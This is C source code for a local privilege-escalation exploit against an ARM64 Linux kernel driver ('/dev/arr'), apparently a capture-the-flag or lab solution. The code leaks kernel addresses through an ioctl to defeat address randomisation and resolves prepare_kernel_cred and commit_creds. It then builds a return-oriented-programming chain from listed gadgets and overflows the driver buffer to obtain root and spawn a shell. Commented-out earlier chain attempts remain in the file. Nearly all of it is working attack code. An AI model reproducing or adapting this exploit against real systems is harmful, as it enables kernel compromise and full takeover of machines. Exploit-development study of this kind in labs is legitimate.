#include "libpwn.c"

#define DEVICE "/dev/arr"
#define IOCTL_MAGIC 'k'
#define IOCTL_SET_BUFFER     _IOW(IOCTL_MAGIC, 7, buffer_data)
#define IOCTL_GET_BUFFER     _IOR(IOCTL_MAGIC, 8, buffer_data)
#define EGG 0x4141414141410000

typedef struct {
    char *buffer;    
    size_t length;          
    size_t max_length;      
} buffer_data;

char buffer[1024*2];
int fd;
u64 user_sp;

void ioctl_get_buffer(char *where, u64 length) {
    buffer_data req = {
        .buffer = where,
        .length = length,
        .max_length = length+1,
    };

    if (ioctl(fd, IOCTL_GET_BUFFER, &req) < 0) error("IOCTL_GET_BUFFER");
}

void ioctl_set_buffer(char *what, u64 length) {
    buffer_data req = {
        .buffer = what,
        .length = length,
        .max_length = length+1,
    };

    if (ioctl(fd, IOCTL_SET_BUFFER, &req) < 0) error("IOCTL_SET_BUFFER");
}

static inline void save_user_state(void) {
    asm volatile(
        "mov %0, sp\n"
        : "=r"(user_sp)
        :
        : "memory"
    );

    printf("[+] SP: 0x%lx\n", user_sp);
}

int main() {
    fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        panic("open");
    }

    ioctl_get_buffer(buffer, 1024);
    // dump_hex(buffer, 1024);

    for(int i = 0; i < sizeof(buffer)/0x8; i++) {
        u64 nibble = ((u64 *)buffer)[i] & 0xfff;
        if (nibble == 0x348) {
            kbase = ((u64 *)buffer)[i] - 0x258348;
            break;
        }
        if (nibble == 0xab8) {
            kbase = ((u64 *)buffer)[i] - 0x240ab8;
            break;
        } 
    }
    u64 prepare_kernel_cred = kbase + 0xb1384;
    u64 commit_creds = kbase + 0xb10c4;
    u64 modprobe_path = kbase + 0x1b80e70;
    u64 ret_to_user = kbase + 0x12870;
    info2("kernel base", kbase);
    info2("prepare kernel cred", prepare_kernel_cred);
    info2("commit creds", commit_creds);
    info2("modprobe path", modprobe_path);
    info2("ret to user", ret_to_user);

    save_user_state();
    info2("spawn shell", (u64)spawn_shell);

    u64 ldr_x0 = kbase + 0x262f10;              // : ldr x0, [sp, #0x28] ; ldp x29, x30, [sp], #0x30 ; autiasp ; ret
    u64 ldr_x1 = kbase + 0x59a75c;              // : ldr x1, [sp, #0x68] ; mov x0, x1 ; ldp x27, x28, [sp, #0x50] ; ldp x29, x30, [sp], #0x70 ; autiasp ; ret
    u64 mov_x1_x22_blr_x23 = kbase + 0x4c1c4c;  // : mov x1, x22 ; blr x23
    u64 mov_x1_x20_blr_x23 = kbase + 0x12de3c;  // : mov x1, x20 ; blr x23
    u64 mov_x1_x20_blr_x22 = kbase + 0x440580;  // : mov x1, x20 ; blr x22
    u64 mov_x0_x20_blr_x23 = kbase + 0x235314;  // : mov x0, x20 ; blr x23
    u64 blr_x19 = kbase + 0x852950;             // : blr x19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; autiasp ; ret
    u64 msr_el0 = kbase + 0x1455c;              // : msr sp_el0, x1 ; nop ; nop ; nop ; nop ; nop ; nop ; ret
    u64 blr_x21 = kbase + 0xdaa5c0;             // : blr x21 ; ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; autiasp ; ret
    u64 add_sp = kbase + 0xa7d280;              // : add sp, sp, #0x170 ; autiasp ; ret
    u64 msr_elr_el1_eret = kbase + 0x12938;

    memset(buffer, 0x0, sizeof(buffer));
    // ROP Chain, index not it order but the assignment are in order of execution/operation
    ((u64 *)buffer)[0x81] = mov_x0_x20_blr_x23;
    ((u64 *)buffer)[0x83] = 0x0;
    ((u64 *)buffer)[0x86] = blr_x19;
    ((u64 *)buffer)[0x82] = prepare_kernel_cred;
    ((u64 *)buffer)[0x89] = blr_x19;
    ((u64 *)buffer)[0x8a] = commit_creds;
    ((u64 *)buffer)[0x8d] = mov_x1_x20_blr_x22;
    ((u64 *)buffer)[0x8f] = user_sp;
    ((u64 *)buffer)[0x85] = blr_x21;
    ((u64 *)buffer)[0x84] = msr_el0;
    ((u64 *)buffer)[0x91] = ret_to_user;
    ((u64 *)buffer)[0xb6] = (u64)spawn_shell;
    ((u64 *)buffer)[0xb7] = (u64)0x20001000;
    ((u64 *)buffer)[0xb5] = (u64)user_sp;

    // FAILED ROP ATTEMPT
    // ((u64 *)buffer)[0x81] = mov_x1_x21_mov_x0_x20_blr_x23;
    // ((u64 *)buffer)[0x83] = 0x0;
    // ((u64 *)buffer)[0x86] = blr_x19;
    // ((u64 *)buffer)[0x82] = prepare_kernel_cred;
    // ((u64 *)buffer)[0x89] = blr_x19;
    // ((u64 *)buffer)[0x8a] = commit_creds;
    // ((u64 *)buffer)[0x8d] = mov_x1_x20_blr_x22;
    // ((u64 *)buffer)[0x8f] = user_sp;
    // ((u64 *)buffer)[0x85] = blr_x21;
    // ((u64 *)buffer)[0x84] = msr_el0;
    // ((u64 *)buffer)[0x91] = msr_elr_el1_eret;
    // ((u64 *)buffer)[0x94] = (u64)spawn_shell;
    // ((u64 *)buffer)[0x95] = 0x3c5;
    // ((u64 *)buffer)[0xb4] = (u64)spawn_shell;


    // FAILED ROP ATTEMPT
    // ((u64 *)buffer)[0x81] = ldr_x0;
    // ((u64 *)buffer)[0x8d] = 0x0;
    // ((u64 *)buffer)[0x89] = blr_x19;
    // ((u64 *)buffer)[0x82] = prepare_kernel_cred;
    // ((u64 *)buffer)[0x8f] = blr_x19;
    // ((u64 *)buffer)[0x90] = commit_creds;
    // ((u64 *)buffer)[0x93] = mov_x1_x20_blr_x23;
    // ((u64 *)buffer)[0x95] = user_sp;
    // ((u64 *)buffer)[0x86] = blr_x19;
    // ((u64 *)buffer)[0x94] = msr_el0;
    // ((u64 *)buffer)[0x97] = msr_elr_el1_eret;
    // ((u64 *)buffer)[0x84] = (u64)spawn_shell;
    // ((u64 *)buffer)[0x85] = 0x20001000;

    for(int i = 0; i < sizeof(buffer)/0x8; i++) {
        if (i == 0x83 ) continue;
        // if (i == 0x8d || i == 0x85 ) continue;
        if (((u64 *)buffer)[i] == 0x0) {
            ((u64 *)buffer)[i] = EGG + i;
        }
    }

    ioctl_set_buffer(buffer, 1024+0x200);

    _pause_("end of exploit...");
}